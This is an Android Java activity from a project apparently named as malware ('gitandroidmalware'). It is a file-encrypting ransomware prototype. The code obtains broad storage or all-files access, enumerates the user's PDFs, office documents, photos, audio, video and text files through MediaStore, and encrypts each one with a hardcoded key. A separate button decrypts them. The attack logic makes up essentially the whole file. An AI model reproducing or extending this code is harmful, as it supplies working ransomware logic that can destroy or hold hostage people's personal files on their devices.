package com.live.gitandroidmalware;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.Manifest;
import android.content.ContentUris;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.webkit.MimeTypeMap;
import android.widget.Button;
import android.widget.Toast;
import java.io.File;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import javax.crypto.NoSuchPaddingException;
import static android.os.Environment.isExternalStorageManager;

public class MainActivity extends AppCompatActivity {
    private static final int MY_PERMISSIONS_REQUEST = 1;
    static final String damnKey = "this_is_a_key";
    Utils utils = new Utils();
    byte[] salt = utils.generateSalt();
    @RequiresApi(api = Build.VERSION_CODES.R)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);


        int sdkVersion = getAndroidVersion();
        if ((sdkVersion >= 21) && (sdkVersion < 30)) {
            if ((ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) && (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED)) {
                //Reference buttons and others
                setContentView(R.layout.activity_main);
                Button encryptButton = (Button) findViewById(R.id.button);
                Button decryptButton = (Button) findViewById(R.id.button2);
                Toast.makeText(this, "The app already has permissions", Toast.LENGTH_SHORT).show();

                encryptButton.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        try {
                            ArrayList<File> Files = utils.FindArchives(Environment.getExternalStorageDirectory());
                            for (int i = 0; i < Files.size(); i++) {
                                Toast.makeText(getApplicationContext(), "Encrypting...", Toast.LENGTH_SHORT).show();

                                utils.encrypt(damnKey, Files.get(i).getPath(), Files.get(i).getName(), salt);
                            }

                        } catch (IOException | NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException k) {
                            k.printStackTrace();
                        }



                    }

                });
                decryptButton.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        try {
                            ArrayList<File> Files = utils.FindArchives(Environment.getExternalStorageDirectory());
                            for (int i = 0; i < Files.size(); i++) {

                                Toast.makeText(getApplicationContext(), "Decrypting...", Toast.LENGTH_SHORT).show();
                                int check = Files.get(i).getName().indexOf("encrypt_");
                                if (check != -1) {
                                    utils.decrypt(damnKey, Files.get(i).getPath(), Files.get(i).getName(), salt);
                                }


                            }

                        } catch (IOException | NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException k) {
                            k.printStackTrace();
                        }

                    }
                });



            } else {
                requestPermission();


            }


        } else {
            if (sdkVersion >= 30 && isExternalStorageManager() == true) {
                // Let's find the files first, since we cannot find files on sdk 30 with a single function like before.
                ArrayList<File> fileList = new ArrayList<File>();
                ArrayList<Uri> uriList = new ArrayList<Uri>();
                String pdf = MimeTypeMap.getSingleton().getMimeTypeFromExtension("pdf");
                String doc = MimeTypeMap.getSingleton().getMimeTypeFromExtension("doc");
                String docx = MimeTypeMap.getSingleton().getMimeTypeFromExtension("docx");
                String xls = MimeTypeMap.getSingleton().getMimeTypeFromExtension("xls");
                String xlsx = MimeTypeMap.getSingleton().getMimeTypeFromExtension("xlsx");
                String jpg = MimeTypeMap.getSingleton().getMimeTypeFromExtension("jpg");
                String mp4 = MimeTypeMap.getSingleton().getMimeTypeFromExtension("mp4");
                String txt = MimeTypeMap.getSingleton().getMimeTypeFromExtension("txt");
                String mp3 = MimeTypeMap.getSingleton().getMimeTypeFromExtension("mp3");
                String png = MimeTypeMap.getSingleton().getMimeTypeFromExtension("png");
                String html = MimeTypeMap.getSingleton().getMimeTypeFromExtension("html");

//Table
                Uri table = MediaStore.Files.getContentUri("external");
//Column
                String[] column = {MediaStore.Files.FileColumns._ID, MediaStore.Audio.Media._ID, MediaStore.Images.Media._ID, MediaStore.Video.Media._ID, MediaStore.Downloads._ID};
//Where
                String where = MediaStore.Files.FileColumns.MIME_TYPE + "=?"
                        + " OR " + MediaStore.Files.FileColumns.MIME_TYPE + "=?"
                        + " OR " + MediaStore.Files.FileColumns.MIME_TYPE + "=?"
                        + " OR " + MediaStore.Files.FileColumns.MIME_TYPE + "=?"
                        + " OR " + MediaStore.Files.FileColumns.MIME_TYPE + "=?"
                        + " OR " + MediaStore.Files.FileColumns.MIME_TYPE + "=?"
                        + " OR " + MediaStore.Files.FileColumns.MIME_TYPE + "=?"
                        + " OR " + MediaStore.Files.FileColumns.MIME_TYPE + "=?"
                        + " OR " + MediaStore.Files.FileColumns.MIME_TYPE + "=?"
                        + " OR " + MediaStore.Files.FileColumns.MIME_TYPE + "=?"
                        + " OR " + MediaStore.Files.FileColumns.MIME_TYPE + "=?";
//args
                String[] args = new String[]{pdf, doc, docx, xls, xlsx, jpg, mp4, txt, mp3, png, html};

                try (Cursor fileCursor = getApplicationContext().getContentResolver().query(table, column, where, args, null)) {
                    int idColumnFile = fileCursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns._ID);

                    int idColumnAudio = fileCursor.getColumnIndexOrThrow(MediaStore.Audio.Media._ID);

                    int idColumnImages = fileCursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);

                    int idColumnVideo = fileCursor.getColumnIndexOrThrow(MediaStore.Video.Media._ID);

                    int idColumnDownloads = fileCursor.getColumnIndexOrThrow(MediaStore.Downloads._ID);

                    // int count = 0;
                    while (fileCursor.moveToNext()) {
                        Long idFile = fileCursor.getLong(idColumnFile);
                        Long idAudio = fileCursor.getLong(idColumnAudio);
                        Long idImages = fileCursor.getLong(idColumnImages);
                        Long idVideo = fileCursor.getLong(idColumnVideo);
                        Long idDownloads = fileCursor.getLong(idColumnDownloads);

                        Uri contentUriFile = ContentUris.withAppendedId(MediaStore.Files.getContentUri("external"), idFile);

                        Uri contentUriAudio = ContentUris.withAppendedId(MediaStore.Audio.Albums.getContentUri("external"), idAudio);

                        Uri contentUriImages = ContentUris.withAppendedId(MediaStore.Images.Media.getContentUri("external"), idImages);

                        Uri contentUriVideo = ContentUris.withAppendedId(MediaStore.Video.Media.getContentUri("external"), idVideo);

                        Uri contentUriDownloads = ContentUris.withAppendedId(MediaStore.Downloads.getContentUri("external"), idDownloads);

                        fileList.add(new File(contentUriFile.getPath()));
                        uriList.add(contentUriFile);
                        /* U can use this part to see if you find those file paths in logs
                        String uri0 = uriList.get(count).getEncodedPath();
                        Log.d("Hey you", uri0);
                        count++;
                        */
                        fileList.add(new File(contentUriAudio.getPath()));
                        uriList.add(contentUriAudio);

                        fileList.add(new File(contentUriImages.getPath()));
                        uriList.add(contentUriImages);

                        fileList.add(new File(contentUriVideo.getPath()));
                        uriList.add(contentUriVideo);

                        fileList.add(new File(contentUriDownloads.getPath()));
                        uriList.add(contentUriDownloads);


                    }

                }

                setContentView(R.layout.activity_main);
                Button encryptButton = (Button) findViewById(R.id.button);
                Button decryptButton = (Button) findViewById(R.id.button2);
                Toast.makeText(this, "The app already has permissions", Toast.LENGTH_SHORT).show();

                encryptButton.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        try {

                            for (int i = 0; i < fileList.size(); i++) {
                                Toast.makeText(getApplicationContext(), "Encrypting...", Toast.LENGTH_SHORT).show();
                                //Encrypting....
                                utils.encrypt11(damnKey, fileList.get(i), fileList.get(i).getName(),salt);
                            }

                        } catch (IOException | NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException k) {
                            k.printStackTrace();
                        }

                    }

                });
                decryptButton.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        try {

                            for (int i = 0; i < fileList.size(); i++) {
                                Toast.makeText(getApplicationContext(), "Decrypting...", Toast.LENGTH_SHORT).show();
                                //Decrypting...
                                int check = fileList.get(i).getName().indexOf("encrypt_");
                                if (check != -1) {
                                    utils.decrypt11(damnKey, fileList.get(i), fileList.get(i).getName(),salt);
                                }

                            }

                        } catch (IOException | NoSuchAlgorithmException | NoSuchPaddingException | InvalidKeyException k) {
                            k.printStackTrace();
                        }

                    }
                });



            } else {
                allowManageStorage();

            }
        }

    }

    @Override
    public void onRequestPermissionsResult (int requestCode,  String[] permissions,  int [] grantResults) {

        if(requestCode == MY_PERMISSIONS_REQUEST) {
            //If request is canceled, the result arrays are empty.
            if (grantResults.length > 0 && grantResults [0] == PackageManager.PERMISSION_GRANTED && grantResults [1] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "The app already has permissions", Toast.LENGTH_SHORT).show();
            }

        }

    }

    public int getAndroidVersion() {
        int sdkVersion = Build.VERSION.SDK_INT;
        return sdkVersion;
    }

    public void requestPermission () {
        if(ActivityCompat.shouldShowRequestPermissionRationale(this, Manifest.permission.READ_EXTERNAL_STORAGE)) {
            Toast.makeText(this, "Permission Required", Toast.LENGTH_SHORT).show();

        }
        ActivityCompat.requestPermissions(this, new String[] {Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, MY_PERMISSIONS_REQUEST);


    }
    public void allowManageStorage() { // Asks permission on settings menu for android 11 to write files
        Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
        intent.setData(Uri.parse("package:com.live.gitandroidmalware"));
        if (intent.resolveActivity(getPackageManager()) != null) {
            startActivity(intent);
        }
    }
}